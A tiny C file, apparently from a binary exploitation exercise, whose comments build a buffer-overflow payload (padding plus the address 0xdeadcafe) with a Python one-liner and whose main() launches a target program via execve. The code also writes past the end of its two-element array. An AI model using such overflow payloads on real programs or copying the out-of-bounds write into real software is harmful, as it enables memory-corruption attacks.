// python -c 'print "A"*16 + "\xfe\xca\xad\xde"+ "\x42\x42\x42\x42" + "\x5a"' > exploit.raw
// run with ./ex < exploit.raw

int main() {
  char* path[2];
  path[0] = "./trois";
  path[1] = "25";
  path[2] = 0;
  int err = execve(path[0], path, 0);
}
